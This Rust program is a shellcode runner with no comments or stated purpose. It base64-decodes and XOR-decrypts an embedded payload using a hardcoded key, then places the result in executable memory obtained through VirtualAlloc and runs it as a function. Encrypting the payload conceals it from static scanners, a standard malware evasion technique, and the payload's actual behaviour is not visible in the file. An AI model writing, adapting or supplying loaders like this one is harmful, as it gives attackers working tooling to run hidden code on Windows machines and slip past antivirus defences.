use std::mem::transmute;
use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualAlloc;

fn main() {
    let bs4 = "qjjm1KmBh2VZago7dDsfECUOAYIPBc4nEj/4H0gS0Qt2OO5CCSFI0hMgBlv8I3yB33pRLGhhZTSzvn4MUZu4tAQxNHjSO2fuG1YDa+XgzclzRjAY740xEjp2ox3bEkId3TBFeVi5pDMRlYIrvl/FCXKQfWGjBXS13jayhF0bW5hukBDBFWoLQVEvcrtAsxUF+AYUGWudIzT5ezsJ2xpGEFegJLtd4Q9kiSsTK201FBsyHnEJKxcN9p5XMh+vugIYDyotu0uAEJqmlRYij2pNQXNGMFBqBcj4c3ZzTRHga9I595rl4pnyxw8r8cyg1tC+pg6zlEJxQwl494itJV/hHkUCClpZMAbsg5WeCVQHLm8WPlVQ";

    let key = "Vpe0YiGeYjKj5kMAsF0PjMEurwsMPZZY";

    let decrypted = xor_decrypt(bs4.as_bytes(), key.as_bytes());

    let buffer = &decrypted[..];

    unsafe {
        let ptr = VirtualAlloc(std::ptr::null_mut(), buffer.len(), 0x00001000, 0x40);

        if GetLastError() == 0 {
            std::ptr::copy(buffer.as_ptr() as *const u8, ptr as *mut u8, buffer.len());

            let exec = transmute::<*mut c_void, fn()>(ptr);
            exec();
        }
    }
}

fn xor_decrypt(encrypted: &[u8], key: &[u8]) -> Vec<u8> {
    let encrypted = base64::decode(encrypted).expect("msg");

    let mut decrypted = Vec::new();
    for (i, &b) in encrypted.iter().enumerate() {
        decrypted.push(b ^ key[i % key.len()]);
    }
    decrypted
}
